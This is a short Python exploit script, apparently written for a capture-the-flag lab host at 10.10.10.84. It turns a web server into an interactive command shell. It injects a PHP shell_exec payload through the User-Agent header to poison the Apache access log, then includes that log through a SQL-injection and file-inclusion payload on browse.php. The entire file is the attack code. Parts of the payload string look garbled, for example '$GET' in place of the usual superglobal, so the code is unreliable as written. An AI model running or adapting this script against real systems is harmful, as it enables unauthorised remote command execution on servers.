#!/usr/bin/python
from bs4 import BeautifulSoup
import re
import readline
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = { "http": "http://127.0.0.1:1080", "https": "http://127.0.0.1:1080" }

while True:
    cmd = raw_input("> ")
    headers = { "User-Agent": "<?php echo shell_exec($GET['cmd']); ?>  /var/log/apache/access.log; %s'); ?>**END**" % cmd}
    r = requests.get("http://10.10.10.84/", headers=headers)
    file = "/var/log/apache/access.log"
    payload = "25' union select all \"%s\" -- -" % ("invalid' union select all '" + file)
    r = requests.get("http://10.10.10.84/browse.php?file=%s" % payload, proxies=proxies, verify=False)
    soup = BeautifulSoup(r.text, 'html.parser')
    m = re.search("\*\*BEGIN\*\*(.*)\*\*END\*\*", str(soup.body), flags=re.DOTALL)
    if m:
        print m.group(1)
    else:
        print("No output")
		